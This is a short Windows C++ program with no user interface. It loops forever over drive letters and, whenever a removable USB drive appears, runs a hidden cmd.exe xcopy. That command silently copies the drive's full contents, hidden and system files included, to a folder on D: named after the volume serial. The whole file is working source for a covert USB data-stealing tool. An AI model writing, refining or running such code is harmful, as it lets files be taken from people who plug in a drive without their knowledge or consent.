#include <Windows.h>
#include <Tchar.h>

int APIENTRY wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int)
{
	WCHAR diskPath[] = { 'A',':','\0' }, instr[MAX_PATH]{ '\0' };
	for (DWORD diskInf; *diskPath < 'Z' + 1; (*diskPath == 'Z' ? *diskPath = 'A' : ++ * diskPath))
	{
		if (GetDriveType(diskPath) == DRIVE_REMOVABLE && GetVolumeInformation(diskPath, 0, 0, &diskInf, 0, 0, 0, 0))
		{
			_stprintf_s(instr, MAX_PATH, L"/c xcopy %lc:\\ D:\\usbfile\\%10u\\ /e /f /s /y /d /c /h", *diskPath, diskInf);
			SHELLEXECUTEINFO sei = { sizeof(sei) };
			sei.lpFile = L"cmd";
			sei.lpParameters = instr;
			sei.nShow = SW_HIDE;
			if (ShellExecuteEx(&sei) && sei.hProcess)WaitForSingleObject(sei.hProcess, INFINITE);
		}
		Sleep(500);
	}
}
